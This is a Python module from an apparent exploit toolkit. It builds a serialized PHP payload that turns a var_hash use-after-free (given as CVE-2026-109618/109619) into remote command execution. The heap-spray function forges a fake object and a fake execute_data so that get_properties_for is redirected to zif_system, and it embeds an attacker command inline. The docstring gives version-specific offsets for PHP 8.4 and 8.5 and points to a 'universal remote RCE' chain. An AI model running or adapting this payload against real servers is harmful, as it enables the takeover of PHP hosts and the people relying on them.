#!/usr/bin/env python3
# INDEX: forge stdclass zif_system fire with free-arg1 inline command | fpm | resolved addresses + gpf offset
"""Free-arg1 UAF->RCE fire-payload builder (CVE-2026-109618 / CVE-2026-109619).

Sibling of fire.py on the same var_hash-UAF reused-dangle chain
(chains/universal_remote_rce.py). fire.py hijacks handlers->get_properties_for
to libc system(), pinning arg1 to the object pointer and capping the command at
the object's 16-byte GC header (<=14 bytes). This variant hijacks it to PHP's
internal zif_system instead and lays the fake object out as a fake
zend_execute_data, so zif_system's handler(execute_data* ex) reads arg1 from a
FREE, independently-placed pointer -- an inline fake zend_string, lifting the
command to the gap before the handler slot (~63 B on 8.4.26's gpf_off 0xC0,
~71 B on 8.5's 0xC8). Pointing arg1 at an EXTERNAL buffer instead, for longer
commands, does not execute -- php_var_serialize walks it as nested PHP
structures and faults first; out of scope here, inline-only.

Pure byte construction: no transport, no printing. The caller supplies the
resolved stdClass ce, the resolved zif_system address, the spray-slot address,
gpf_off (0xC0 on 8.4, 0xC8 on 8.5), and the spray geometry of its own engine
module. On an echo-serialize sink the firing request returns none/crash (same
as fire.py's libc-system fire); a pool worker survives. Pure stdlib, safe under
python3 -I.
"""
from __future__ import annotations

import os
import struct
import sys

_HERE = os.path.dirname(os.path.abspath(__file__))
_POC_ROOT = os.path.dirname(os.path.dirname(_HERE))  # poc/
for _p in (_HERE, _POC_ROOT):
    if _p not in sys.path:
        sys.path.insert(0, _p)
from primitives.encode.zend_string_forge import pack_zend_string  # noqa: E402

IS_OBJECT = 0x08
IS_STRING = 0x06


def build_fire_payload(ce, zif, spray_addr, cmd, gpf_off, *,
                       spray_len, spray_count, c_part, ref_base,
                       obj_off=0x38, str_off=0xA0):
    """Build the free-arg1 fire spray payload bytes.

    The stale bucket zval (@40) is IS_OBJECT and points at a fake object at
    spray_addr+obj_off laid out as a fake zend_execute_data. Its handlers
    (+0x18) point back at itself so the get_properties_for lookup lands inside
    the forged region; the slot at obj_off+gpf_off is zif_system. num_args
    (+0x2C)=1 and arg1 (+0x50/+0x58, IS_STRING) point at an inline fake
    zend_string at spray_addr+str_off holding the command. The command is capped
    by the gap to the handler slot (the inline string must not overrun it).
    """
    if isinstance(cmd, str):
        cmd = cmd.encode("latin-1")

    sp = bytearray(spray_len)
    obj = spray_addr + obj_off
    cmd_ptr = spray_addr + str_off

    struct.pack_into("<Q", sp, 40, obj)                  # stale bucket zval.value -> fake obj
    struct.pack_into("<I", sp, 48, IS_OBJECT)            # stale bucket zval.type
    struct.pack_into("<I", sp, obj_off + 0x00, 1)        # gc refcount = 1
    struct.pack_into("<Q", sp, obj_off + 0x10, ce)       # obj.ce (resolved stdClass)
    struct.pack_into("<Q", sp, obj_off + 0x18, obj)      # obj.handlers -> self
    struct.pack_into("<I", sp, obj_off + 0x2C, 1)        # ex.This.u2.num_args = 1
    struct.pack_into("<Q", sp, obj_off + 0x50, cmd_ptr)  # ex arg1.value -> inline zend_string
    struct.pack_into("<I", sp, obj_off + 0x58, IS_STRING)  # ex arg1.type_info
    struct.pack_into("<Q", sp, obj_off + gpf_off, zif)   # handlers->get_properties_for = zif_system

    end = str_off + 0x18 + len(cmd) + 1
    assert end <= obj_off + gpf_off, \
        f"inline command ({len(cmd)} B) overruns the get_properties_for slot"
    pack_zend_string(sp, str_off, len(cmd), refcount=1, type_info=0x106, h=0, val=cmd)
    sp[str_off + 0x18 + len(cmd)] = 0
    sp = bytes(sp)

    total = 1 + spray_count + 1
    parts = [f'i:0;{c_part}'.encode('latin-1')]
    for i in range(spray_count):
        parts.append(f'i:{i+1};s:{spray_len}:"'.encode('latin-1') + sp + b'";')
    parts.append(f'i:{spray_count+1};R:{ref_base};'.encode('latin-1'))
    return b'a:' + str(total).encode() + b':{' + b''.join(parts) + b'}'
